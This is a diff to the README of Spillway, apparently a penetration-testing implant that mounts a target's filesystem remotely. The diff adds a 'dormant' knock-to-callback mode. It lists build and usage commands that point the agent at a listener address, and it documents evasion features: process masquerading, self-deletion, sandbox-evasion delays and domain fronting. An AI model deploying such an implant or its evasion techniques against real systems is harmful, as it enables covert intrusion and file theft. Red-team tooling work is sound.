@@ -37,9 +37,9 @@ Spillway is a reverse/bind FUSE filesystem mount for penetration testing. Deploy
 <tr>
 <td width="50%">
 
-### Reverse & Bind
+### Reverse, Bind & Dormant
 
-Agent calls back to your listener (reverse) or listens for your connection (bind). Both modes over TLS 1.3 with optional certificate fingerprint pinning.
+Agent calls back (reverse), listens (bind), or sits silent until an authenticated knock triggers a callback (dormant). All modes over TLS 1.3 with optional certificate fingerprint pinning.
 
 </td>
 <td width="50%">
@@ -128,6 +128,9 @@ make listener
 # Build agent — bind mode
 ./build.sh bind 0.0.0.0:8443
 
+# Build agent — dormant mode (knock-to-reverse)
+./build.sh dormant 10.10.14.5:443 --knock-port 49152
+
 # Build all 5 platforms at once
 ./build.sh reverse 10.10.14.5:443 --all
 ```
@@ -144,6 +147,9 @@ find ./target/ -perm -4000
 
 # Bind mode — connect to listening agent
 ./bin/spillway connect TARGET:8443 --mount ./target --key <PSK>
+
+# Dormant mode — send knock to wake agent, then catch callback
+./bin/spillway knock TARGET --port 49152 --key <PSK>
 
 # Check active sessions
 ./bin/spillway status
@@ -187,6 +193,8 @@ Spillway/
 │   │   └── proxy.go          # HTTP CONNECT proxy tunneling
 │   ├── agent/
 │   │   ├── agent.go          # Agent main loop, reconnect logic
+│   │   ├── knock.go          # AF_PACKET knock listener (dormant mode)
+│   │   ├── knock_stub.go     # Dormant stub for listener build
 │   │   ├── fsops.go          # 17 filesystem operation handlers
 │   │   ├── pathjail.go       # Path resolution, symlink jail, excludes
 │   │   ├── ratelimit.go      # Token bucket rate limiter
@@ -223,7 +231,7 @@ Spillway/
 | 1. Build | `build.sh` injects config via `-ldflags -X`, cross-compiles static binary |
 | 2. Deploy | Agent binary transferred to target (zero args, zero config files) |
 | 3. Opsec | Agent masquerades process, disables core dumps, optionally self-deletes |
-| 4. Connect | Reverse: agent dials listener with jittered backoff. Bind: agent listens |
+| 4. Connect | Reverse: agent dials listener. Bind: agent listens. Dormant: waits for knock, then dials |
 | 5. Auth | TLS 1.3 handshake, then 2-round HMAC-SHA256 PSK mutual authentication |
 | 6. Mux | ClientMux (listener) and ServerMux (agent) multiplex requests over single conn |
 | 7. Mount | Listener creates FUSE mount, FUSE kernel calls route through ClientMux |
@@ -305,7 +313,7 @@ All agent configuration is injected at compile time via `-ldflags -X`. The agent
 
 | Category | Build Flags | Description |
 |----------|-------------|-------------|
-| Mode | `reverse` / `bind` | Connection direction (positional arg) |
+| Mode | `reverse` / `bind` / `dormant` | Connection direction (positional arg) |
 | Address | `HOST:PORT` | Listener address or bind address (positional arg) |
 | Auth | `--key KEY` | Pre-shared key (base64), auto-generated if omitted |
 | TLS | `--sni HOST` | SNI hostname for domain fronting (random from pool) |
@@ -315,6 +323,7 @@ All agent configuration is injected at compile time via `-ldflags -X`. The agent
 | Opsec | `--procname NAME` | Process name masquerade (OS-aware default) |
 | Opsec | `--self-delete` | Delete binary after execution |
 | Opsec | `--delay N` | Startup delay in seconds (sandbox evasion, max 3600) |
+| Network | `--knock-port PORT` | UDP knock port for dormant mode (default 49152) |
 | Network | `--proxy ADDR` | HTTP CONNECT proxy address |
 | Network | `--rate-limit N` | Outbound bandwidth limit (tokens/sec) |
 | Network | `--rate-burst N` | Rate limit burst size |
